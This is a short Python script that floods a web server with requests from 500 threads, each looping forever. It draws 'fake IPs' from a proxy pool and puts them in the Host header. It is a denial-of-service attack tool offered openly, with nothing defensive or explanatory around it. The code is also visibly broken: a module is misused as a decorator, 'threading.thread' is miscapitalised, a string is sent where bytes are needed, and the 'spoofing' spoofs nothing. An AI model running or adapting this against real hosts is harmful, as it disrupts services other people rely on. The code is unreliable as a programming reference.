import socket
import threading
import retry
import requests

target_url = "127.0.0.1"
port = 80

def generate_fake_ip():
    """
    Dependencies: proxy_pool docker images

    """
    return requests.get("proxy_pool/get/").json()
  
@retry(tries=1)
def attack():
  while True:
    fake_ip = generate_fake_ip()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_url, port))
    s.sendto(("GET /" + target_url + "HTTP/1.1\r\n").encode("ascii"), (target_url, port))
    s.sendto(("Host: " + fake_ip + "\r\n\r\n"), (target_url, port))
    s.close()

for i in range(500):
  thread = threading.thread(target=attack)
  thread.start()
